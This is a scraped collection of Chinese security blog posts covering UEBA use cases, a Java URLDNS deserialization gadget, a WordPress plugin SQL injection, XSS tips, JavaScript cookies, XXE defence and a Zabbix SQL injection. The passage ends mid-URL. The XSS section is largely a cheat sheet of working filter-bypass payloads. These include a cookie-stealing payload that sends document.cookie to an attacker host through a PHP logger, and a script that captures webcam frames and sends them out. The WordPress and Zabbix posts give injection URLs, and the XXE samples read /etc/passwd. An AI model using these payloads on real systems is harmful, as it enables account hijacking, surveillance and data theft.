上述内容的DLP攻击是基于行为和风险的。\n8、失败的登录尝试和账户锁定问题描述：    1. 产生的原因有很多，例如爆破攻击、密码重置、忘记密码、乌龙指等；    2. 在可允许的上下文中需要几分钟或者几小时去解决每个锁定；    3. 通常需要一个人去确认和解决。\nUEBA解法：    1. 基于风险进行排序，允许安全团队关闭高风险的账号；    2. 提供锁定账号的相关内容协助快速处置；    3. 在账号锁定前后发生了什么？\n9、服务账号滥用问题描述：    1. 服务账号往往有较高的权限，对于攻击者来说是高价值目标；    2. 一些组织甚至不知道有一些服务账号在他们组织中存在；    3. 典型的安全工具对服务账户提供有限或不可见性的防护。\nUEBA解法：    1. 通过理解、分析行为，自动识别服务账户；    2. 标记表明妥协或滥用的异常行为；    3. 通过相关的事件背景，提供一个清晰的事件链。\n10、安全告警调查问题描述：    1. 告警排查在很多分析中都是关键任务；    2. 它非常手工、耗时且容易出错；    3. 有太多的事件告警时误报。\nUEBA解法：    1. 分析告警整体的通过全部的数据源；    2. 通过行为分析和风险排序去发现高风险告警或者异常告警；    3. 为事件排查人员提供一系列简短的高保真告警调查；    4. 通过自动化的方式规模化处理告警。\n","categories":["安全数据分析"],"tags":["UEBA"]},{"title":"URLDNS反序列化gadget分析","url":"/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/","content":"0x00 分析gadget代码ysoserial中URLDNS gadget代码只有短短几行\nURLStreamHandler handler = new SilentURLStreamHandler();········static class SilentURLStreamHandler extends URLStreamHandler &#123;        protected URLConnection openConnection(URL u) throws IOException &#123;                return null;        &#125;        protected synchronized InetAddress getHostAddress(URL u) &#123;                return null;        &#125;&#125;\n注释中提到“为避免在创建payload时触发DNS解析”，这里就有两个问题：\n1、创建payload时为什么会触发DNS解析？\n2、重写URLStreamHandler的作用是什么呢？\n\nHashMap ht = new HashMap();  //HashMap中将包含URLURL u = new URL(null, url, handler);  //创建URL，作为HashMap中的keyht.put(u, url); //值可以是任何Serializable, URL作为key触发DNS lookup。\n这几句的含义是创建一个HashMap，将URL对象作为key，在HashMap put操作的时候，会触发URL的序列化，在序列化的时候触发DNS解析。\n在开头注释中也提示了Gadget Chain\n\nHashMap.readObject()\n\n\n  HashMap.putVal()\n\n\n    HashMap.hash()\n\n\n      URL.hashCode()\n\n\n\nReflections.setFieldValue(u, &quot;hashCode&quot;, -1);//在上面的put过程中，URL的hashCode被计算并缓存。这将重置它，以便下次调用hashCode时触发DNS查找。\n这句在这里的作用不太好理解，大概推测是hashcode的值为-1时，有不同的作用，这个疑问我们也留到下文中来寻找答案。\n0x01 java.net.URL类为什么会触发DNS解析？根据注释中的Chain，我们找到URL.hashCode()，if (hashCode != -1)这句可以解释上节中的“-1”的疑问了，当不等于“-1”的时候，会直接返回，而不会调用到 handler.hashCode中。\npublic synchronized int hashCode() &#123;    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;&#125;\n\n继续看 handler.hashCode做了哪些事情，可以看到getHostAddress会请求一次DNS解析，构成反序列化链路中的执行点。\nprotected int hashCode(URL u) &#123;    int h = 0;    // Generate the protocol part.    String protocol = u.getProtocol();    if (protocol != null)        h += protocol.hashCode();    // Generate the host part.    InetAddress addr = getHostAddress(u);\n \n0x02 java.net.URL类如何触发DNS解析的（寻找触发点）？定位到触发点HashMap.readObject()，可以看到这个方法将java.io.ObjectInputStream反序列化后的值putVal进Node中。\nprivate void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                         mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#x27;s the nearest public type to        // what we&#x27;re actually creating.        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;\n\nputVal的入参如下，其中在第一个入参hash方法（计算key.hashCode()并将较高的哈希值扩展为较低的哈希值），会调用key的hashcode方法。所以如果key是URL对象的话，就会调用到URL.hashCode方法，进而触发DNS解析。\n/** * Implements Map.put and related methods * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#x27;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */final V putVal(int hash, K key, V value, boolean onlyIfAbsent,               boolean evict)\n\n\n\n0x03 如何利用/利用代码为什么要这么写？需要注意两个点：1、hashCode默认是-1，如果触发一次DNS解析，则会缓存hashCode，导致后续请求时无法触发；2、避免在生成payload的时候put触发DNS解析，这里也就回答文章开头的两个疑问，通过重写getHostAddress避免触发DNS解析。\n为什么HashMap要自己实现writeObject和readObject方法，而不是使用JDK统一的默认序列化和反序列化操作呢？首先要明确序列化的目的，将java对象序列化，一定是为了在某个时刻能够将该对象反序列化，而且一般来讲序列化和反序列化所在的机器是不同的，因为序列化最常用的场景就是跨机器的调用，而序列化和反序列化的一个最基本的要求就是，反序列化之后的对象与序列化之前的对象是一致的。\nHashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。\nHash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key=’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的。\n参考链接：https://juejin.cn/post/6844903954774491144\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"Wordpress_Plugin_SinglePersonalMessage1.0.3 sql injection","url":"/Wordpress_Plugin_SinglePersonalMessage1.0.3%20sql%20injection/","content":"exploit-db\n# Exploit Title: Single Personal Message 1.0.3 – Plugin WordPress – Sql Injection# Date: 28/11/2016# Exploit Author: Lenon Leite# Vendor Homepage: https://wordpress.org/plugins/simple-personal-message/# Software Link: https://wordpress.org/plugins/simple-personal-message/# Contact: http://twitter.com/lenonleite# Website: http://lenonleite.com.br/# Category: webapps# Version: 1.0.3# Tested on: Windows 8\n\n0X01 代码分析好不容易从github上找了份有漏洞的版本\n目录结构如图\n\n既然是注入就从交互点下手，搜索sql语句，顺着目录挨个寻找\n从外到内寻找交互的地方，在admin/class-simple-personal-message-admin.php发现了几十处,例如下面这种\n$user_login = esc_sql(wp_get_current_user()-&gt;user_login);global $wpdb;$table_name = $wpdb-&gt;prefix . &#x27;spm_message&#x27;;$wpdb-&gt;get_results(&quot;SELECT * FROM $table_name WHERE receiver = &#x27;&quot; . $user_login . &quot;&#x27; AND status = 0 AND receiver_deleted = 0&quot;, OBJECT);return $wpdb-&gt;num_rows;\n然而这个里面所有的都用esc_sql过滤了\n继续往里层查找，在admin/partials/simple-personal-message-admin-view.php发现\n&lt;?phpglobal $wpdb;$table = $wpdb-&gt;prefix . &#x27;spm_message&#x27;;$id = esc_attr($_GET[&#x27;message&#x27;]);$message = $wpdb-&gt;get_results(&quot;SELECT * FROM $table WHERE id = $id&quot;);$user = get_user_by(&#x27;login&#x27;, $message[0]-&gt;sender);?&gt;\n\n可以很明显的看到\n$id = esc_attr($_GET[&#x27;message&#x27;]);$message = $wpdb-&gt;get_results(&quot;SELECT * FROM $table WHERE id = $id&quot;);\nmessage没有经过过滤就拼接到sql语句中了\n0x02 证明正常状态下\n\n拼接一下message参数\nhttp://localhost/wordpress/wp-admin/admin.php?page=simple-personal-message-outbox&amp;action=view&amp;message=1%20UNION%20SELECT%201,2.3,4,5,user(),7,8,9,10,11,12%20FROM%20wp_terms%20WHERE%20term_id=1\n\n","categories":["漏洞分析"],"tags":["PHP"]},{"title":"XSS Tips 及修复方案","url":"/XSS%20Tips%20%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/","content":"关于一些XSS防御的方法\nJSON/JSONP 接口不规范导致 XSScallback 未转义导致 XSSJSONP 输出开头未换行导致 flash 构造攻击JSON/JSONP 键值未转义导致 XSS\n解决方案：\n后端通过 token 或 referer 检查防止 CSRF对 callback 字段的输出进行限制，对 JSON 内容的键值进行转义，上文中的escapeJsonContentType 标准化JSONP输出最前面加了两个 \\r\\n 防止 flash 构造攻击\n\n前端模版里的变量展示方式错误导致 XSS通过预定义函数转义或者利用安全包过滤\n前端代码不规范导致 DOM XSS关键问题在于把数据插入到 DOM 的时候，没有做转义或者过滤\n需要转义五个字符: &lt; &gt; &#39; &quot; &amp; ，漏掉其中任何一个都有可能导致问题。\n富文本解析html，得到所有的html标签和属性。对于不在白名单中的标签，直接删除或者转义。属性值里面的特殊字符要进行转义，防止跃出。比如&lt;img width=&quot;100&quot;&gt;如果我修改100为100&quot; onerror=alert(1)&quot;就变成了&lt;img width=&quot;100&quot; onerror=alert(1)&quot;&quot;&gt;了。对于部分引入外链的属性，如src,href等判断链接是否合法，过滤&lt;a href=javascript:alert(1)&gt;的情况，而且最好是只能使用指定域名下的外链。嵌入falsh的embed标签设置allowscriptaccess=never，allownetworking=none\n\n后台盲打XSS除常规方案外，后台页面要求配置禁止外部链接的CSP策略，确保即使存在漏洞，一般的外部攻击也无法利用。应用所有页面，在response的http头中，都需要附加上CSP策略\n=========================\n\n\n这几天在玩AFSRC的xss漏洞比赛，虽然构造出了许多绕过方法，奈何手速太慢，重复率太感人，在这开一篇，记录下日常遇到的tips\n\n\n\n\n%00(%0f)截断：\n\n\n适用：IE 6\n&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;\n\n\n\n\n\nIE11 ASP.NET  Request Validator bypass:\n\n\n&lt;% style=behavior:url(: onreadystatechange=alert(1)&gt;\n\n\nmhtml:https(IE 8)\n\n\n&lt;iframe src=mhtml:https://louchaooo.github.io/life.html!html&gt;&lt;/iframe&gt;\n\n\nIE8\n\n\n&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;\n\n\nmarquee onStart marquee onStart 重复标签绕过\n\n\n&lt;marquee onStart marquee onStart=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onStart&gt;\n\n\nIE6\n\n\n&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&#39;styleeeeeeee&#39;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;111&lt;/br&gt;\n\n\nIE 8\n\n\n&quot;&gt;&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;\n\n\nIE 8\n\n\n&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;\n\n\nIE 8\n\n\n&lt;div style=&quot;color:rgb(&#39;&#39;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt;\n\n\nIE 7\n\n\n&lt;s%00c%00r%00%00ip%00t&gt;confirm(1);&lt;/s%00c%00r%00%00ip%00t&gt;\n\n\n编码绕过\n\n\n&quot;&gt;&lt;DIV STYLE=&quot;width:\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006F\\006E\\0028\\0070\\0072\\006F\\006D\\0070\\0074\\0028\\0031\\0029\\0029&quot;&gt;\n\n\nIE 7\n\n\n&lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt;\n\n还有一些，无非也是浏览器特性，就先不放这了\n============一些其它的paylaod============探针\n&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;\n&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror= (alert)(/xss/)//&quot;&gt;\n&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt; 过滤掉on事件\n[img]javascript:alert1//http://url/onerror=//a_/img/default/usr50.gif[/img]\n&lt;link type=&#39;application/json+oembed&#39; href=&#39;http://ip/oembed.json&#39;&gt;\n&#123;        &quot;type&quot;: &quot;image&quot;,        &quot;image&quot;: &quot;xss&quot;,        &quot;description&quot;: &quot;descr&#x27; onerror=&#x27;alert(/XSS by skavans/)&quot;,        &quot;image_width&quot;: 1,        &quot;image_height&quot;: 1&#125;\n============盗取cookie=============1、xss平台2、a.php &lt;?php fwrite(fopen(&#39;ali.txt&#39;,&#39;a&#39;),$GET[&#39;c&#39;]).&#39;\\r\\n&#39;; ?&gt;xss payload &lt;img src=&quot;1&quot; onerror=&quot;var a=new Image;a.src=&quot;http://IP/a.php?c=&#39;+document.cookie+&#39;---&#39;+location.pathname&quot;&gt;\n===========比较短的payload==========\n&lt;iframe&gt;(8)\n&quot;onload=&#39;(alert)(8)&#39;//&gt;\n=============Flash Xss=============The ZeroClipboard.swf and ZeroClipboard10.swf are vulnerable to XSS attack, example:http://website/js/ZeroClipboard.swf#?id=\\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500http://website/js/ZeroClipboard10.swf#?id=\\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500http://website/js/ZeroClipboard.swf?id=\\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500http://website/js/ZeroClipboard10.swf?id=\\&quot;))}catch(e){alert(/XSS/.source);}//&amp;width=500&amp;height=500\nvulnerable code:\npublic function ZeroClipboard(){….var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;id = flashvars.id;….ExternalInterface.call(“ZeroClipboard.dispatch”, id, “load”, null);\nthis files get a id parameter from url and passed it to second parameter inside ExternalInterface.call without any validation(only numbers) or proper escaping\\encoding).\n==========html5===========\n&lt;script type=&quot;text/javascript&quot;&gt;function xss() &#123;    window[0].postMessage(&#123; redirectURL: &quot;javascript:alert(/xss/)&quot; &#125;, &quot;*&quot;)&#125;&lt;/script&gt;&lt;iframe src=&quot;https://xxxxxx/ilogin_2.htm&quot; onload=&quot;xss()&quot;&gt;&lt;/iframe&gt;\n\n===========绕过chrome auditor的payload========&lt;script&gt;alert(&#39;evil&#39;)&lt;/script\n===================\nNo space  and  No Slash :\n&lt;svg•onload=alert(1)&gt;  %0Chttps://markitzeroday.com/character-restrictions/xss/2017/07/26/xss-without-dots.html\n跳出&lt;input&gt;标签&quot;&gt;\n==========XSS in Mobile Devices==========\n&lt;body onorientationchange=alert(orientation)&gt;&lt;html ontouchstart=alert(1)&gt;&lt;html ontouchend=alert(1)&gt;&lt;html ontouchmove=alert(1)&gt;&lt;html ontouchcancel=alert(1)&gt;&lt;svg onload=alert(navigator.connection.type)&gt;&lt;svg onload=alert(navigator.battery.level)&gt;&lt;svg onload=alert(navigator.battery.dischargingTime)&gt;&lt;svg onload=alert(navigator.battery.charging)&gt;&lt;script&gt;navigator.geolocation.getCurrentPosition(function(p)&#123;alert(&#x27;Latitude:&#x27;+p.coords.latitude+&#x27;,Longitude:&#x27;+p.coords.longitude+&#x27;,Altitude:&#x27;+p.coords.altitude);&#125;)&lt;/script&gt;(remember to change “+” for “%2B” in URLs)&lt;script&gt;d=document;v=d.createElement(‘video’);c=d.createElement(‘canvas’);c.width=640;c.height=480;navigator.webkitGetUserMedia(&#123;‘video’:true&#125;,function(s)&#123;v.src=URL.createObjectURL(s);v.play()&#125;,function()&#123;&#125;);c2=c.getContext(‘2d’);x=’c2.drawImage(v,0,0,640,480);fetch(“//HOST/”+c2.canvas.toDataURL())‘;setInterval(x,5000);&lt;/script&gt;open(c2.canvas.toDataURL())&lt;svg onload=navigator.vibrate(500)&gt;&lt;svg onload=navigator.vibrate([500,300,100])&gt;\n\n\n","categories":["WEB安全"],"tags":["XSS"]},{"title":"XSS利用之Cookie","url":"/XSS%E5%88%A9%E7%94%A8%E4%B9%8BCookie%20/","content":"0x01 什么是cookiecookie是浏览器提供的一种机制，它将document对象的cookie属性提供给JavaScript。可以由JavaScript对其进行控制，而并不是JavaScript本身的性质。\ncookie是存于用户硬盘的一个文件，这个文件通常对应于一个域名，当浏览器再次访问这个域名时，便使这个cookie可用。因此，cookie可以跨越一个域名下的多个网页，但不能跨越多个域名使用。不同的浏览器对cookie的实现也不一样，但其性质是相同的。cookie机制将信息存储于用户硬盘，因此可以作为全局变量，这是它最大的一个优点。它可以用于以下几种场合：\n\n保存用户登录状态。例如将用户id存储于一个cookie内，这样当用户下次访问该页面时就不需要重新登录了，现在很多论坛和社区都提供这样的功能。cookie还可以设置过期时间，当超过时间期限后，cookie就会自动消失。因此，系统往往可以提示用户保持登录状态的时间：常见选项有一个月、三个月、一年等。\n跟踪用户行为。例如一个天气预报网站，能够根据用户选择的地区显示当地的天气情况。如果每次都需要选择所在地是烦琐的，当利用了cookie后就会显得很人性化了，系统能够记住上一次访问的地区，当下次再打开该页面时，它就会自动显示上次用户所在地区的天气情况。因为一切都是在后台完成，所以这样的页面就像为某个用户所定制的一样，使用起来非常方便。\n定制页面。如果网站提供了换肤或更换布局的功能，那么可以使用cookie来记录用户的选项，例如：背景色、分辨率等。当用户下次访问时，仍然可以保存上一次访问的界面风格。\n创建购物车。正如在前面的例子中使用cookie来记录用户需要购买的商品一样，在结账的时候可以统一提交。例如淘宝网就使用cookie记录了用户曾经浏览过的商品，方便随时进行比较。\n\n当然，上述应用仅仅是cookie能完成的部分应用，还有更多的功能需要全局变量。cookie的缺点主要集中于安全性和隐私保护.主要包括以下几种：\n\ncookie可能被禁用。当用户非常注重个人隐私保护时，他很可能禁用浏览器的cookie功能；\ncookie是与浏览器相关的。这意味着即使访问的是同一个页面，不同浏览器之间所保存的cookie也是不能互相访问的；\ncookie可能被删除。因为每个cookie都是硬盘上的一个文件，因此很有可能被用户删除；\ncookie安全性不够高。所有的cookie都是以纯文本的形式记录于文件中，因此如果要保存用户名密码等信息时，最好事先经过加密处理。0x02 设置cookie\n\n每个cookie都是一个名/值对，可以把下面这样一个字符串赋值给document.cookie：document.cookie=&quot;userId=828&quot;;如果要一次存储多个名/值对，可以使用分号加空格（; ）隔开，例如：document.cookie=&quot;userId=828; userName=hulk&quot;;在cookie的名或值中不能使用分号（;）、逗号（,）、等号（=）以及空格。在cookie的名中做到这点很容易，但要保存的值是不确定的。如何来存储这些值呢？方法是用escape()函数进行编码，它能将一些特殊符号使用十六进制表示，例如空格将会编码为“20%”，从而可以存储于cookie值中，而且使用此种方案还可以避免中文乱码的出现。例如：document.cookie=&quot;str=&quot;+escape(&quot;I love ajax&quot;);相当于：document.cookie=&quot;str=I%20love%20ajax&quot;;当使用escape()编码后，在取出值以后需要使用unescape()进行解码才能得到原来的cookie值。尽管document.cookie看上去就像一个属性，可以赋不同的值。但它和一般的属性不一样，改变它的赋值并不意味着丢失原来的值，例如连续执行下面两条语句：document.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=hulk&quot;;这时浏览器将维护两个cookie，分别是userId和userName，因此给document.cookie赋值更像执行类似这样的语句：document.addcookie(&quot;userId=828&quot;);document.addcookie(&quot;userName=hulk&quot;);事实上，浏览器就是按照这样的方式来设置cookie的，如果要改变一个cookie的值，只需重新赋值，例如：document.cookie=&quot;userId=929&quot;;这样就将名为userId的cookie值设置为了929。\n0x03 获取cookie的值下面介绍如何获取cookie的值。cookie的值可以由document.cookie直接获得：var strcookie=document.cookie;这将获得以分号隔开的多个名/值对所组成的字符串，这些名/值对包括了该域名下的所有cookie。例如：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--document.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=hulk&quot;;var strcookie=document.cookie;alert(strcookie);//--&gt;&lt;/script&gt;\n\n只能够一次获取所有的cookie值，而不能指定cookie名称来获得指定的值，这正是处理cookie值最麻烦的一部分。用户必须自己分析这个字符串，来获取指定的cookie值，例如，要获取userId的值，可以这样实现：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--//设置两个cookiedocument.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=hulk&quot;;//获取cookie字符串var strcookie=document.cookie;//将多cookie切割为多个名/值对var arrcookie=strcookie.split(&quot;; &quot;);var userId;//遍历cookie数组，处理每个cookie对for(var i=0;i&lt;arrcookie.length;i++)&#123;      var arr=arrcookie[i].split(&quot;=&quot;);      //找到名称为userId的cookie，并返回它的值      if(&quot;userId&quot;==arr[0])&#123;             userId=arr[1];             break;      &#125;&#125;alert(userId);//--&gt;&lt;/script&gt;\n\n这样就得到了单个cookie的值\n用类似的方法，可以获取一个或多个cookie的值，其主要的技巧仍然是字符串和数组的相关操作。\n0x04 给cookie设置终止日期到现在为止，所有的cookie都是单会话cookie，即浏览器关闭后这些cookie将会丢失，事实上这些cookie仅仅是存储在内存中，而没有建立相应的硬盘文件。在实际开发中，cookie常常需要长期保存，例如保存用户登录的状态。这可以用下面的选项来实现：document.cookie=&quot;userId=828; expires=GMT_String&quot;;其中GMT_String是以GMT格式表示的时间字符串，这条语句就是将userId这个cookie设置为GMT_String表示的过期时间，超过这个时间，cookie将消失，不可访问。例如：如果要将cookie设置为10天后过期，可以这样实现：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--//获取当前时间var date=new Date();var expireDays=10;//将date设置为10天以后的时间date.setTime(date.getTime()+expireDays*24*3600*1000);//将userId和userName两个cookie设置为10天后过期document.cookie=&quot;userId=828; userName=hulk; expire=&quot;+date.toGMTString();//--&gt;&lt;/script&gt;\n0x05 删除cookie为了删除一个cookie，可以将其过期时间设定为一个过去的时间，例如：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--//获取当前时间var date=new Date();//将date设置为过去的时间date.setTime(date.getTime()-10000);//将userId这个cookie删除document.cookie=&quot;userId=828; expire=&quot;+date.toGMTString();//--&gt;&lt;/script&gt;\n0x06 指定可访问cookie的路径默认情况下，如果在某个页面创建了一个cookie，那么该页面所在目录中的其他页面也可以访问该cookie。如果这个目录下还有子目录，则在子目录中也可以访问。例如在www.xxxx.com/html/a.html中所创建的cookie，可以被www.xxxx.com/html/b.html或www.xxx.com/ html/ some/c.html所访问，但不能被www.xxxx.com/d.html访问。为了控制cookie可以访问的目录，需要使用path参数设置cookie，语法如下：document.cookie=&quot;name=value; path=cookieDir&quot;;其中cookieDir表示可访问cookie的目录。例如：document.cookie=&quot;userId=320; path=/shop&quot;;就表示当前cookie仅能在shop目录下使用。如果要使cookie在整个网站下可用，可以将cookie_dir指定为根目录，例如：document.cookie=&quot;userId=320; path=/&quot;;\n0x07 指定可访问cookie的主机名和路径类似，主机名是指同一个域下的不同主机，例如：www.google.com和gmail.google.com就是两个不同的主机名。默认情况下，一个主机中创建的cookie在另一个主机下是不能被访问的，但可以通过domain参数来实现对其的控制，其语法格式为：document.cookie=&quot;name=value; domain=cookieDomain&quot;;以google为例，要实现跨主机访问，可以写为：document.cookie=&quot;name=value;domain=.google.com&quot;;这样，所有google.com下的主机都可以访问该cookie。\n0x08 综合示例：构造通用的cookie处理函数cookie的处理过程比较复杂，并具有一定的相似性。因此可以定义几个函数来完成cookie的通用操作，从而实现代码的复用。下面列出了常用的cookie操作及其函数实现。\n1．添加一个cookie：addcookie(name,value,expireHours)该函数接收3个参数：cookie名称，cookie值，以及在多少小时后过期。这里约定expireHours为0时不设定过期时间，即当浏览器关闭时cookie自动消失。该函数实现如下：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--function addcookie(name,value,expireHours)&#123;      var cookieString=name+&quot;=&quot;+escape(value);      //判断是否设置过期时间      if(expireHours&gt;0)&#123;             var date=new Date();             date.setTime(date.getTime+expireHours*3600*1000);             cookieString=cookieString+&quot;; expire=&quot;+date.toGMTString();      &#125;      document.cookie=cookieString;&#125;//--&gt;&lt;/script&gt;\n2．获取指定名称的cookie值：getcookie(name)该函数返回名称为name的cookie值，如果不存在则返回空，其实现如下：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--function getcookie(name)&#123;      var strcookie=document.cookie;      var arrcookie=strcookie.split(&quot;; &quot;);      for(var i=0;i&lt;arrcookie.length;i++)&#123;            var arr=arrcookie[i].split(&quot;=&quot;);            if(arr[0]==name)return arr[1];      &#125;      return &quot;&quot;;&#125;//--&gt;&lt;/script&gt;\n3．删除指定名称的cookie：deletecookie(name)该函数可以删除指定名称的cookie，其实现如下：\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--function deletecookie(name)&#123;       var date=new Date();       date.setTime(date.getTime()-10000);       document.cookie=name+&quot;=v; expire=&quot;+date.toGMTString();&#125;//--&gt;&lt;/script&gt; \n\n也可以用另一种网上流传的:\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;function SetCookie(name,value)//两个参数，一个是cookie的名子，一个是值&#123;    var Days = 30; //此 cookie 将被保存 30 天    var exp  = new Date();    //new Date(&quot;December 31, 9998&quot;);    exp.setTime(exp.getTime() + Days*24*60*60*1000);    document.cookie = name + &quot;=&quot;+ escape (value) + &quot;;expires=&quot; + exp.toGMTString();&#125;function getCookie(name)//取cookies函数       &#123;    var arr = document.cookie.match(new RegExp(&quot;(^| )&quot;+name+&quot;=([^;]*)(;|$)&quot;));     if(arr != null) return unescape(arr[2]); return null;&#125;function delCookie(name)//删除cookie&#123;    var exp = new Date();    exp.setTime(exp.getTime() - 1);    var cval=getCookie(name);    if(cval!=null) document.cookie= name + &quot;=&quot;+cval+&quot;;expires=&quot;+exp.toGMTString();&#125;SetCookie (&quot;xiaoqi&quot;, &quot;3&quot;)alert(getCookie(&#x27;xiaoqi&#x27;));&lt;/script&gt;\n\n\n","categories":["WEB安全"],"tags":["XSS"]},{"title":"XXE代码审计和防御策略 for Java","url":"/XXE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%20for%20Java/","content":"1、Java代码中的XXE触发点XXE的产生需要满足：1. 接收外部传入的XML格式，2.未禁用外部实体。\nJAXP DocumentBuilderFactory, SAXParserFactory and DOM4JXMLInputFactory (a StAX parser)Oracle DOM ParserTransformerFactoryValidatorSchemaFactorySAXTransformerFactoryXMLReaderSAXReaderSAXBuilderNo-op EntityResolverJAXB UnmarshallerXPathExpressionjava.beans.XMLDecoderOther XML ParsersSpring Framework MVC/OXM XXE VulnerabilitiesCastor……..\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\nXXE&amp;SSRF&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://internal.vulnerable-website.com/&quot;&gt; ]&gt;\n\nXInclude攻击&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;\n\n\n\n2、如何防御XXE攻击2.1 禁用外部实体解析例如SAXReader\nsaxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);\n\n更多参考：https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\n2.2 升级到安全版本Apache POI &gt;= 4.1.1\n","categories":["JAVA安全"],"tags":["JAVA"]},{"title":"zabbix SQL Inject Vul","url":"/zabbix%20SQL%20Inject%20Vul/","content":"zabbix是一个开源的企业级性能监控解决方案。近日，zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。\n0x01 漏洞概述无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。\n0x02 影响程度\n攻击成本：低\n危害程度：高\n是否登陆：不需要\n影响版本：2.2.x，3.0.0-3.0.3\n\n0x03 漏洞测试在zabbix的地址后面添加：\n\n利用方式一\n\n/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim estamp=1471054088083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi story.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2’3297&amp;updateProfil e=true&amp;screenitemid=&amp;period=3600&amp;stime=20170813040734&amp;resourcetype= 